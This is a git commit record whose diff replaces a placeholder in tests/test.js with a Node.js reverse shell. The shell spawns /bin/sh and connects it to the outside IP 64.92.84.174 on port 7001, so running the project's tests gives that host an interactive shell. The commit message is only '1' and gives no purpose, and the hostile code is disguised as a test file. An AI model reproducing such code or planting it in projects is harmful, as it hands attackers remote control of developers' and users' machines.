bf01d46d551399a7102c7342bd6f3ed5d29c3a2e
RashestLight <terrelldixon02@yahoo.com>
2023-04-14 14:26:38 -0400

    1

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,16 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+(function(){
+    var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+
+    var client = new net.Socket();
+
+    client.connect(7001, " 64.92.84.174", function(){
+        
+        client.pipe(sh.stdin);
+
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
